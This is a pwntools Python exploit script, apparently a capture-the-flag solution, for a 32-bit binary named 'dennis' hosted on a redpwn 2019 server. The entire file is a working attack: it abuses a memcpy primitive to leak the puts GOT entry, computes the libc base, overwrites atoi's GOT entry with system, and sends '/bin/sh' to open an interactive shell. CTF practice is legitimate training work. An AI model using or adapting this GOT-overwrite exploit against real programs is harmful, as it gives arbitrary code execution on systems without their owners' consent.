#!/usr/bin/env python2

from pwn import *
import sys

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./dennis')

LOCAL = len(sys.argv) == 1
if LOCAL:	
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	p = elf.process()
else:
	libc = ELF('./libc-2.23.so')
	p = remote('chall2.2019.redpwn.net', 4006)

def greet(size):
	p.sendlineafter(': ', '1')
	p.sendlineafter(': ', str(size))

def write(size):
	p.sendlineafter(': ', '2')
	p.sendlineafter(': ', str(size))

def yeet():
	p.sendlineafter(': ', '3')

def eat(input):
	p.sendlineafter(': ', '4')
	p.sendlineafter(': ', str(input))

def delete():
	p.sendlineafter(': ', '5')

def repeat(input):
	p.sendlineafter(': ', '6')
	p.sendlineafter(': ', str(input))

def byebye():
	p.sendlineafter(': ', '7')
	p.close()

puts_got = elf.got['puts']
spm = elf.symbols['spm']

greet(8) # Create a buffer of 8 bytes
eat(p32(puts_got) + p32(spm)) # Make spm->spm = puts_got, and spm->spmm = spm

# Now what memcpy will do is dereference spm (i.e dereference puts_got) and get the libc address, then
# put that address into *(spm->spmm), which is literally just *spm
yeet() # memcpy(spm->spmm, spm, sizeof(spm)) = memcpy(spm, puts_got, 8)

write(4) # Read four bytes from spm

# Format the leak, then get system's address
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']

log.info('libc base at ' + hex(libc_base))

# I notice that the greet() function takes in a string and calls atoi() with that string, so atoi() is
# the perfect GOT entry candidate to overwrite

greet(8) # First, new chunk of 8 bytes
eat(p32(system) + p32(elf.got['atoi'])) # Then, place the addresses correctly
yeet() # memcpy(atoi_got, system, 8)

#gdb.attach(p, 'b *0x08048b23')

greet('/bin/sh')

p.interactive()